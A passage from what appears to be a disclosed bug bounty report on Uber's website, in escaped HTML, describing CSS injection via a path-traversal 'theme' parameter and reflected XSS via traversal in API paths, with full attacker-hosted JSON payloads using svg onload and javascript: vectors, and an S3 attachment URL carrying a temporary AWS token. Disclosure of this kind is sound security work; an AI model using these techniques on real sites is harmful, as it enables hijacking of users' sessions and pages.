TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=54bb14e31971e4c97669f9c0942ce0d04bb370569ba614a3ecce604da6e98ae8\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/107/834faa37742f57ab1afaf12dad30d67a30e7ec1f/Response.png?response-content-disposition=attachment%3B%20filename%3D%22Response.png%22%3B%20filename%2A%3DUTF-8%27%27Response.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042241Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026amp;X-Amz-Signature=54bb14e31971e4c97669f9c0942ce0d04bb370569ba614a3ecce604da6e98ae8\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"css-injection\"\u003eCSS injection\u003c/h3\u003e\n\n\u003cp\u003eThis vulnerability was reproduced via parameter \u003ccode\u003etheme\u003c/code\u003e from URL \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2F%3Ftheme%3D..%2Fen%2F%2Fexample.com%2Fcss-code.css%2523\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/?theme=../en//example.com/css-code.css%23\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as follow:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;link rel=\u0026quot;stylesheet\u0026quot; id=\u0026quot;theme-css\u0026quot; href=\u0026quot;https://uber.com/stylesheets/../en//example.com/css-code.css#.css\u0026quot;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBrowser try to load CSS code from: \u003ca href=\"/redirect?url=https%3A%2F%2Fexample.com%2Fcss-code.css\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eexample.com/css-code.css\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nTo fix \u003ca href=\"/uber\"\u003e@uber\u003c/a\u003e added whitelisting the theme names.\u003c/p\u003e\n\n\u003ch3 id=\"reflected-cross-site-scripting\"\u003eReflected Cross-Site Scripting\u003c/h3\u003e\n\n\u003cp\u003eThis vulnerability was produced via insufficient filtration API requests.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eExample URL to controlling API request: \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fcareers%2Flist%2F-CONTROLLED-%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/careers/list/-CONTROLLED-/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nBrowser try to load JSON content from: \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fapi%2Fjobs%2F-CONTROLLED-\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/api/jobs/-CONTROLLED-\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSending API requests to another domain: \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fcareers%2Flist%2F..%252f..%252fen%252f%252fexample.com%252ffile.json%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nBrowser try to load JSON content from: \u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fuber.com%2Fen%2F%2Fexample.com%2Ffile.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/en//example.com/file.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u0026gt;\u0026gt;\u0026gt; \u003ca href=\"/redirect?url=https%3A%2F%2Fexample.com%2Ffile.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eexample.com/file.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSo, on controlled me domain I placed JSON file with this content:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{  \n   \u0026quot;id\u0026quot;:\u0026quot;9999\u0026quot;,\n   \u0026quot;title\u0026quot;:\u0026quot;XSS on Uber.com\u0026quot;,\n   \u0026quot;overview\u0026quot;:\u0026quot;\u0026lt;svg onload=\\\u0026quot;alert(\u0026#39;XSS on \u0026#39;+ document.domain)\\\u0026quot;\u0026gt;\u0026quot;,\n   \u0026quot;responsibilities\u0026quot;:null,\n   \u0026quot;qualifications\u0026quot;:null,\n   \u0026quot;lastUpdated\u0026quot;:\u0026quot;2016-01-16 06:29 AM\u0026quot;,\n   \u0026quot;formattedTeam\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;team\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;subTeam\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;formattedLocation\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;slugs\u0026quot;:{  \n      \u0026quot;team\u0026quot;:\u0026quot;xss\u0026quot;,\n      \u0026quot;subTeam\u0026quot;:\u0026quot;xss\u0026quot;,\n      \u0026quot;city\u0026quot;:\u0026quot;xss\u0026quot;,\n      \u0026quot;country\u0026quot;:\u0026quot;xss\u0026quot;\n   },\n   \u0026quot;city\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;country\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;jobUrl\u0026quot;:\u0026quot;javascript:alert(\u0026#39;XSS on \u0026#39;+ document.domain)\u0026quot;,\n   \u0026quot;normalizedTitle\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;normalizedContent\u0026quot;:\u0026quot;xss\u0026quot;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand get unusually high degree of control over the page.\u003cbr\u003e\nThen I found a similar XSS vector on \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fcities%2F%25252e%25252e%252f%25252e%25252e%252fen%252f%252fexample.com%252ffile.json%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nBrowser try to load JSON content from: \u003ca href=\"/redirect?url=https%3A%2F%2Fexample.com%2Ffile.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eexample.com/file.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nVulnerable JSON  for \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.uber.com%2Fcities%2F-CONTROLLED-%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003euber.com/cities/-CONTROLLED-/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{  \n   \u0026quot;products\u0026quot;:[  \n      {  \n         \u0026quot;productDisplayType\u0026quot;:\u0026quot;uberx\u0026quot;,\n         \u0026quot;fare\u0026quot;:{  \n            \u0026quot;safeRideFee\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;perMinute\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;minimum\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;cancellation\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;fareType\u0026quot;:\u0026quot;time_plus_distance\u0026quot;,\n            \u0026quot;base\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;isDistanceUnitMetric\u0026quot;:false,\n            \u0026quot;perDistanceUnit\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;additionalFees\u0026quot;:[  \n\n            ]\n         },\n         \u0026quot;displayName\u0026quot;:\u0026quot;uberX\u0026quot;,\n         \u0026quot;tagline\u0026quot;:\u0026quot;XSS\u0026quot;,\n         \u0026quot;taxiFareInfo\u0026quot;:false,\n         \u0026quot;finePrint\u0026quot;:[  \n            \u0026quot;XSS\u0026quot;\n         ]\n      },\n      {  \n         \u0026quot;productDisplayType\u0026quot;:\u0026quot;uberxl\u0026quot;,\n         \u0026quot;fare\u0026quot;:{  \n            \u0026quot;safeRideFee\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;perMinute\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;minimum\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;cancellation\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;fareType\u0026quot;:\u0026quot;time_plus_distance\u0026quot;,\n            \u0026quot;base\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;isDistanceUnitMetric\u0026quot;:false,\n            \u0026quot;perDistanceUnit\u0026quot;:\u0026quot;USD9999.99\u0026quot;,\n            \u0026quot;additionalFees\u0026quot;:[  \n\n            ]\n         },\n         \u0026quot;displayName\u0026quot;:\u0026quot;uberXL\u0026quot;,\n         \u0026quot;tagline\u0026quot;:\u0026quot;XSS\u0026quot;,\n         \u0026quot;taxiFareInfo\u0026quot;:false,\n         \u0026quot;finePrint\u0026quot;:[  \n            \u0026quot;XSS\u0026quot;\n         ]\n      }\n   ],\n   \u0026quot;flatRates\u0026quot;:[  \n\n   ],\n   \u0026quot;id\u0026quot;:9999,\n   \u0026quot;cityId\u0026quot;:9999,\n   \u0026quot;flatRateDisplayNames\u0026quot;:[  \n\n   ],\n   \u0026quot;geoJson\u0026quot;:null,\n   \u0026quot;geoPoint\u0026quot;:{  \n      \u0026quot;latitude\u0026quot;:33.951252,\n      \u0026quot;longitude\u0026quot;:-83.382943\n   },\n   \u0026quot;slug\u0026quot;:\u0026quot;xss\u0026quot;,\n   \u0026quot;twitterHandle\u0026quot;:null,\n   \u0026quot;theme\u0026quot;:{  \n      \u0026quot;name\u0026quot;:\u0026quot;united_states\u0026quot;,\n      \u0026quot;ctaColor\u0026quot;:\u0026quot;#57AD57\u0026quot;,\n      \u0026quot;patternColor\u0026quot;:\u0026quot;#4DB5D9\u0026quot;,\n      \u0026quot;patternColorBackground\u0026quot;:\u0026quot;#A6DAEC\u0026quot;\n   },\n   \u0026quot;rideContent\u0026quot;:\u0026quot;XSS\u0026quot;,\n   \u0026quot;driveContent\u0026quot;:\u0026quot;XSS\u0026quot;,\n   \u0026quot;impactContent\u0026quot;:\u0026quot;XSS\u0026quot;,\n   \u0026quot;name\u0026quot;:\u0026quot;\u0026lt;marquee\u0026gt;XSS\u0026lt;/marquee\u0026gt;\u0026lt;svg onload=\\\u0026quot;alert(\u0026#39;XSS on \u0026#39;+ document.domain)\\\u0026quot;\u0026gt;\u0026quot;,\n   \u0026quot;pageTitle\u0026quot;:\u0026quot;XSS\u0026quot;,\n   \u0026quot;pageDescription\u0026quot;:\u0026quot;XSS\u0026quot;,\n   \u0026quot;productLegalNotice\u0026quot;:null,\n   \u0026quot;pageConfiguration\u0026quot;:{  \n\n   }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e"}]}